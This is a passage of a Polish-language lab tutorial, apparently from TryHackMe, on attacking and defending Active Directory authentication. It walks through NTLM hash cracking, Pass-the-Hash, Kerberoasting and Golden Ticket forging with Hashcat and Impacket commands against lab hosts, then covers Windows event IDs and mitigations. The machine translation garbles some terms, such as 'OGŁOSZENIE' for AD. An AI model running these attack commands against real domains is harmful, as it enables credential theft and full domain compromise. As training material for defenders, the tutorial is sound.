Nowoczesne narzędzia do łamania haseł, takie jak Hashcat, potrafią przetwarzać miliardy kandydatów na hash NTLM na sekundę dzięki akceleracji GPU. Jeśli użytkownik wybierze słabe lub powszechnie używane hasło, jego hash NTLM można złamać w ciągu kilku sekund lub minut. Po odzyskaniu hasła atakujący może normalnie uwierzytelnić się w dowolnej usłudze akceptującej dane uwierzytelniające tego użytkownika.

**Dlaczego to działa:** Skróty NTLM nie zawierają soli i wykorzystują stosunkowo szybki algorytm MD4, dzięki czemu można je niezwykle szybko złamać za pomocą nowoczesnego sprzętu. Słabe hasła łatwo padają ofiarą ataków słownikowych i opartych na regułach.

**Demonstracja praktyczna**

Uzyskałeś następujący skrót NTLM dla użytkownika `phillip`:

```bash
phillip:1106:aad3b435b51404eeaad3b435b51404ee:939B0058BC6DD834ABC4CC08CFEFEA69:::
```

Format jest zgodny ze standardowym formatem skrótu NTLM: `username:uid:LM_hash:NTLM_hash:::`. Skrót NTLM, który musimy złamać, to `939B0058BC6DD834ABC4CC08CFEFEA69`.

Zapisz ten skrót do pliku o nazwie `hash.txt`w formacie wymaganym przez Hashcat:

```bash
939B0058BC6DD834ABC4CC08CFEFEA69
```

Teraz użyj Hashcata do złamania hasza. Użyjemy trybu `1000`dla haszy NTLM i listy słów RockYou:

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

Po zakończeniu działania Hashcat wyświetli złamane hasło. Wynik można wyświetlić za pomocą:

```bash
hashcat -m 1000 hash.txt --show
```

Mając odzyskane hasło, uwierzytelnij się w udostępnionym pliku, korzystając z Impacket `smbclient.py`:

smbclient.py

```bash
root@tryhackme:$ smbclient.py "thm.loc/phillip:<RECOVERED_PASSWORD>"@192.168.11.51
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Type help for list of commands
# 
```

Po nawiązaniu połączenia przejdź do `SHARE3` udziału i pobierz `flag3.txt`.

## Przekaż-hasz

Nawet jeśli hasła nie da się złamać, sam hash często można wykorzystać bezpośrednio do uwierzytelnienia. Jest to znane jako atak Pass-the-Hash (PtH). Ponieważ uwierzytelnianie NTLM wykorzystuje hash hasła bezpośrednio w procesie wyzwania-odpowiedzi, atakujący, który uzyska hash NTLM użytkownika, nie musi znać hasła w postaci zwykłego tekstu – może uwierzytelnić się za pomocą samego hasha.

Jest to szczególnie niebezpieczne, ponieważ nawet silne, niemożliwe do złamania hasła nie zapewniają ochrony przed atakami PtH, jeśli atakujący może uzyskać skrót. Skróty można wyodrębnić z pamięci w zainfekowanych systemach za pomocą narzędzi takich jak Mimikatz lub uzyskać za pomocą technik takich jak ataki przekaźnikowe NTLM.

**Dlaczego to działa:** Protokół NTLM wykorzystuje skrót bezpośrednio w mechanizmie wyzwania-odpowiedzi. Rzeczywiste hasło w postaci zwykłego tekstu nigdy nie jest używane po początkowym haszowaniu. W rezultacie posiadanie skrótu jest funkcjonalnie równoważne ze znajomością hasła podczas uwierzytelniania za pomocą NTLM.

**Demonstracja praktyczna**

Uzyskałeś skrót NTLM dla użytkownika `ben`:

```bash
63CF41DC25C04B8FB79E44B1DEF12C10
```

W przeciwieństwie do poprzedniego przykładu, nie musisz łamać tego hasha. Narzędzia Impacket obsługują uwierzytelnianie Pass-the-Hash bezpośrednio. Użyj `smbclient.py`z `-hashes`parametrem:

Przekaż-hasz

```bash
root@tryhackme:$ smbclient.py thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Type help for list of commands
#
```

Zwróć uwagę na format `-hashes`parametru: `LM_hash:NTLM_hash`. Ponieważ skróty LM są rzadko używane w nowoczesnych środowiskach, podajemy pustą wartość skrótu LM `aad3b435b51404eeaad3b435b51404ee`, a następnie rzeczywisty skrót NTLM.

Po uwierzytelnieniu przejdź do `SHARE4` udziału i pobierz `flag4.txt`.

## Kerberoasting

Kerberoasting to atak wymierzony w konta usług w usłudze Active Directory. Gdy użytkownik żąda dostępu do usługi, otrzymuje bilet serwisowy (TGS-REP) zaszyfrowany hasłem konta usługi. Każdy uwierzytelniony użytkownik domeny może zażądać tych biletów serwisowych dla dowolnej usługi w domenie, nawet dla usług, do których w rzeczywistości nie potrzebuje dostępu.

Atak jest skuteczny, ponieważ zaszyfrowaną część zgłoszenia serwisowego można wyodrębnić i złamać w trybie offline. Jeśli konto serwisowe ma słabe hasło, atakujący może je odzyskać i uzyskać dostęp do konta serwisowego. Konta serwisowe często mają podwyższone uprawnienia, co czyni ten atak szczególnie przydatnym w przypadku eskalacji uprawnień.

**Dlaczego to działa:** Bilety serwisowe są szyfrowane za pomocą skrótu hasła konta serwisowego i może je otrzymać każdy uwierzytelniony użytkownik. Ponieważ szyfrowanie odbywa się za pomocą algorytmu RC4 lub AES, bilety mogą zostać złamane w trybie offline. Konta serwisowe często mają słabe lub niezmienione hasła, ponieważ nie są one regularnie zmieniane, tak jak hasła użytkowników.

**Demonstracja praktyczna**

Najpierw musisz zidentyfikować konta usług, które mają zarejestrowane nazwy SPN. Użyjmy konta Claire w Impacket, `GetUserSPNs.py`aby wyliczyć te konta:

PobierzUserSPNs.py

```bash
root@tryhackme:$ GetUserSPNs.py thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------  -----------  --------  --------------------------  --------------------------  ----------
http/svc_print.thm.loc  svc_printer            2026-02-08 17:13:08.795049  2026-04-30 11:14:01.157692             

$krb5tgs$23$*svc_printer$THM.LOC$thm.loc/svc_printer*$a8cee6d54955985f574fcdf1[...]
```

Spowoduje to wyświetlenie wszystkich kont usług z zarejestrowanymi nazwami SPN i automatyczne żądanie ich biletów serwisowych. Wynik będzie zawierał bilet w formacie gotowym do złamania za pomocą Hashcata.

Zapisz skrót zgłoszenia serwisowego do pliku o nazwie `service_ticket.txt`. Skrót będzie w formacie Hashcat i będzie zaczynał się od `$krb5tgs$23$`.

Użyj Hashcata w trybie `13100`, aby złamać bilety Kerberos TGS-REP:

Hashcat

```bash
root@tryhackme:$ hashcat -m 13100 service_ticket.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1-66-g6a419d06) starting...
```

Po złamaniu hasła odzyskasz hasło do konta usługi `svc_printer`. Użyj tego konta do uwierzytelnienia w udziale plików:

smbclient.py

```bash
root@tryhackme:$ smbclient.py "thm.loc/svc_printer:<RECOVERED_PASSWORD>"@192.168.11.51
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Type help for list of commands
# 
.
```

Przejdź do `SHARE5` udziału i pobierz `flag5.txt`.

## Złoty Bilet

Najpotężniejszym atakiem uwierzytelniającym w domenie Active Directory jest atak Golden Ticket. Polega on na fałszowaniu biletów TGT protokołu Kerberos poprzez wykorzystanie skrótu hasła konta KRBTGT. Ponieważ konto KRBTGT odpowiada za podpisywanie wszystkich biletów TGT w domenie, atakujący, który uzyska ten skrót, może tworzyć ważne bilety dla dowolnego użytkownika w domenie, w tym administratorów domeny, bez konieczności podawania ich rzeczywistych danych uwierzytelniających.

Złote Bilety są niezwykle niebezpieczne, ponieważ zapewniają pełną kontrolę nad domeną i mogą być używane nawet po usunięciu pierwotnego wektora kompromitacji. Bilety pozostają ważne do momentu dwukrotnego zresetowania hasła KRBTGT (ponieważ poprzednie hasło również jest buforowane).

**Dlaczego to działa:** Wszystkie bilety Kerberos TGT są szyfrowane i podpisywane za pomocą skrótu hasła konta KRBTGT. Jeśli atakujący uzyska ten skrót, może sfałszować bilety, które kontrolery domeny uznają za legalne. Sfałszowane bilety mogą przyznawać dowolny poziom dostępu i są praktycznie nie do odróżnienia od biletów legalnych.

**Demonstracja praktyczna**

Uzyskałeś skrót KRBTGT dla domeny:

```bash
KRBTGT Hash: e9a9871b93d7b4d73c91665bd6df6e50
Domain SID: S-1-5-21-990021728-513958382-3715561918
```

Użyj Impacket'a `ticketer.py`, aby podrobić Złoty Bilet dla Administratora Domeny:

ticketer.py

```bash
root@tryhackme:$ ticketer.py -nthash e9a9871b93d7b4d73c91665bd6df6e50 -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for thm.loc/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache
```

Spowoduje to utworzenie pliku o nazwie `Administrator.ccache`zawierającego sfałszowany bilet TGT. Wyeksportuj go jako pamięć podręczną danych uwierzytelniających Kerberos:

KRB5CCNAME

```bash
root@tryhackme:$ export KRB5CCNAME=Administrator.ccache
```

Teraz możesz uwierzytelnić się w udziale plików jako administrator domeny, korzystając z uwierzytelniania Kerberos:

smbclient.py

```bash
root@tryhackme:$ smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Type help for list of commands
#
```

Pamiętaj, że korzystając z uwierzytelniania Kerberos, musisz użyć nazwy hosta, a nie adresu IP. Przejdź do `SHARE6` udziału i pobierz `flag6.txt`.

## Zrozumienie wpływu

Te cztery ataki pokazują, dlaczego bezpieczeństwo uwierzytelniania jest kluczowe w środowiskach AD. Słabe hasła, błędy w projektowaniu protokołów i niewystarczająca ochrona poufnych danych uwierzytelniających mogą prowadzić do całkowitego przejęcia domeny. W kolejnych salach tego modułu zagłębisz się w każdy z tych ataków, poznając zaawansowane techniki ich wykorzystania i, co równie ważne, sposoby obrony przed nimi.

Kluczowym wnioskiem jest to, że uwierzytelnianie nie polega tylko na logowaniu użytkowników, ale także na zapewnieniu, że tylko uprawnieni użytkownicy mają dostęp do zasobów, a ich dane uwierzytelniające nie mogą zostać łatwo naruszone lub wykorzystane w niewłaściwy sposób.

System Windows rejestruje zdarzenie bezpieczeństwa przy każdej próbie uwierzytelnienia, a wiedza o tym, które zdarzenieIdentyfikatoryTo, czego należy szukać, odróżnia wykryty atak od niewykrytego. To zadanie mapuje kluczowe zdarzenia na ataki omówione w poprzednich zadaniach i łączy każde z nich z praktycznym sposobem ich łagodzenia.

## Kluczowe identyfikatory zdarzeń systemu Windows

|Identyfikator zdarzenia|Dziennik|Opis|
|---|---|---|
|4624|Bezpieczeństwo|Pomyślne logowanie: sprawdź pakiet uwierzytelniania i typ logowania|
|4625|Bezpieczeństwo|Nieudane logowanie, przydatne do wykrywania rozpylania haseł|
|4768|Bezpieczeństwo|Kerberos TGTwymagany|
|4769|Bezpieczeństwo|Zażądano biletu usługi Kerberos; klucz do wykrycia Kerberoastingu|
|4771|Bezpieczeństwo|Nieudana wstępna autoryzacja Kerberos; przydatne do wykrywania pieczenia AS-REP i ataków siłowych|

## WykrywanieNTLM-Ataki oparte na

Zdarzenie o identyfikatorze **4624** jest rejestrowane na serwerze docelowym po każdym pomyślnym logowaniu. W przypadku korzystania z protokołu NTLM wyróżnia się kilka pól:

- **Pakiet uwierzytelniania:**`NTLM` , podczas gdy logowania Kerberos są wyświetlane `Kerberos`w tym samym polu.
- **Typ logowania:**`3` oznaczający logowanie sieciowe, typowy dla Pass-the-Hash przez WinRM lub SMB.
- **Adres sieci źródłowej:**`blank` . Gdy kontroler domeny weryfikuje logowanie NTLM, zdarzenie 4624 często nie zawiera źródłowego adresu IP, co utrudnia atrybucję. Odpowiednie zdarzenia Kerberos (4768/4769) wypełniają pole adresu klienta.

Logowanie do sieci przy użyciu protokołu NTLM do ważnego celu, np. kontrolera domeny, jest silnym wskaźnikiem próby przeprowadzenia ataku Pass-the-Hash.

## Wykrywanie Kerberoastingu

Identyfikator zdarzenia **4769** jest generowany za każdym razem, gdy żądany jest bilet serwisowy. Kerberoasting generuje skok 4769 zdarzeń w krótkim czasie, często obejmującym wiele kont serwisowych. Należy zwrócić uwagę na dwie rzeczy:

- Duża liczba zdarzeń: 4769 z jednego konta w krótkim czasie.
- **Typ szyfrowania biletów: `0x17`(RC4-HMAC)** , gdzie nowoczesne środowiska domyślnie wystawiają bilety AES-256 ( `0x12`). Żądanie biletu RC4 z konta obsługującegoAESmoże wskazywać na celowe obniżenie wersji w celu przyspieszenia łamania zabezpieczeń w trybie offline.

Warto również monitorować zdarzenie o identyfikatorze **4771** (niepowodzenie wstępnego uwierzytelnienia Kerberos). Skok liczby zdarzeń 4771 na wielu kontach w krótkim czasie może wskazywać na AS-REP Roasting, gdzie atakujący sprawdza, które konta mają wyłączone wstępne uwierzytelnianie, lub próbę ataku siłowego na konta domenowe.

## Środki łagodzące

| Atak            | Łagodzenie                                                                                                                    |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| Przekaż-hasz    | Dodaj konta uprzywilejowane do grupy Chronionych użytkowników; wyłącz NTLM tam, gdzie dostępny jest Kerberos                  |
| Przekaźnik NTLM | EgzekwowaćMŚPpodpisywanie; włącz rozszerzoną ochronę uwierzytelniania (EPA)LDAPIOGŁOSZENIECS                                  |
| Kerberoasting   | Używaj silnych, losowych haseł do kont usług lub przeprowadź migrację do grupowych kont usług (gMSA)                          |
| Złoty Bilet     | Chroń konto KRBTGT, resetując hasło dwukrotnie po każdym podejrzeniu naruszenia                                               |
| Spray z hasłem  | Skonfiguruj zasady blokowania kont; monitoruj zdarzenie o identyfikatorze 4625 pod kątem powtarzających się błędów na kontach |

W tym pokoju dowiedziałeś się o uwierzytelnianiu wOGŁOSZENIEśrodowiskach. Podsumowując, omówiliśmy:

- Różnica między uwierzytelnianiem a autoryzacją w usłudze AD
- JakNTLMIKerberosprotokoły uwierzytelniania działają na wysokim poziomie
- Wrodzone słabości obu protokołów, które czynią je podatnymi na ataki
- Praktyczne wykorzystanie hashowania słabych haseł, ataków Pass-the-Hash, Kerberoasting i Golden Ticket
- Kluczowe zdarzenie okienkoweIdentyfikatorydo wykrywania ataków uwierzytelniających i łagodzenia ich skutków dla każdej techniki

Zrozumienie, jak działa uwierzytelnianie i gdzie można je wykorzystać, jest fundamentalne zarówno dla ataków, jak i obrony środowisk AD. Techniki te reprezentują typowe ścieżki ataków stosowane w rzeczywistych działaniach, od początkowego dostępu do naruszenia domeny.

Odpowiedz na poniższe pytania

Rozumiem uwierzytelnianie AD i jestem gotowy zagłębić się w ataki NTLM!
